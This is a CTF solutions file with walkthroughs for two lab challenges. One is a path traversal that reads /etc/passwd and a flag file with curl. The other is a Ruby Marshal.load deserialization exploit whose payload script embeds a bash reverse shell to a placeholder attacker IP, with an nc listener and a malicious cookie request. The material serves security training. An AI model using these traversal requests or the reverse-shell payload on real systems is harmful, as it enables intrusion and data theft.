# Solutions — intended exploit walkthroughs

Spoilers :)

---

## burrow1 - Burrow Library (path traversal / LFI, Easy)

TLDR: Unsanitized query param that returns the output of any file

**Steps**

1. Browse to `http://<host>:8001/`. Note documents are served from
   `/view?file=<name>`.
2. Confirm the parameter is a raw path by escaping the docs directory, e.g.
   read `/etc/passwd`:

   ```bash
   curl 'http://<host>:8001/view?file=../../../../etc/passwd'
   ```

3. Read the flag directly (traversal or an absolute path both work):

   ```bash
   curl 'http://<host>:8001/view?file=../../../../home/burrow/flag.txt'
   # or
   curl 'http://<host>:8001/view?file=/home/burrow/flag.txt'
   ```

---

## burrow2 - Warren Lounge (insecure deserialization / Ruby `Marshal.load` RCE, Medium)

TLDR: `Marshal.load` is inherently a vulnerable function. We can inject RCE into the `prefs`
cookie by using the code at `/debug/source` as reference

**Steps**

1. Browse to `http://<host>:8002/`. You'll be presented with a preferences page that
   sets a base64 `prefs` cookie. Note the hint toward `/debug/source`.
2. Read the exposed source:

   ```bash
   curl 'http://<host>:8002/debug/source'
   ```

   You should see a few lines of code that run `Marshal.load` on the attacker-controlled
   `prefs` cookie and the `marshal_load` hook that runs `state[:hook]`.

3. Build a malicious `prefs` blob

   ```ruby
   # payload.rb
   require 'base64'
   class Preferences
     def marshal_dump
       { theme: 'dark', motd: 'pwned',
         hook: "bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'" }
     end
   end
   puts Base64.strict_encode64(Marshal.dump(Preferences.new))
   ```

   ```bash
   ruby payload.rb    # prints the base64 prefs blob
   ```

4. Start a listener, then send the blob as the `prefs` cookie:

   ```bash
   nc -lvnp 4444
   curl -b "prefs=<base64-blob>" 'http://<host>:8002/'
   ```

5. Catch the shell (it runs as `burrow`) and read the flag!

   ```bash
   cat /home/burrow/flag.txt
   ```

**Note**: It's obviously possible to do this without a reverse shell, but where's the fun in that :P
